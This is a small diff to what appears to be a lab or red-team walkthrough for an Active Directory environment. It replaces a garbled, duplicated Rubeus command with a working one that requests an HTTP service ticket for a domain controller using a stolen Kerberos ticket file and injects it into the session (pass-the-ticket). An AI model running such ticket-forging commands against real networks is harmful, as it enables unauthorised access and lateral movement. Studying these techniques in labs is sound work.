@@ -135,7 +135,7 @@ Inject that into current session:
 or
 
 ```
-C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\euvendornet.kirbi /service:HTTP/euvendor-/ticket:C:\Users\Public\euvendornet.kirbi /service:HTTP/euvendor-
+C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\euvendornet.kirbi /service:HTTP/euvendor-dc.euvendor.local /ptt
 ```
 
 <br/>
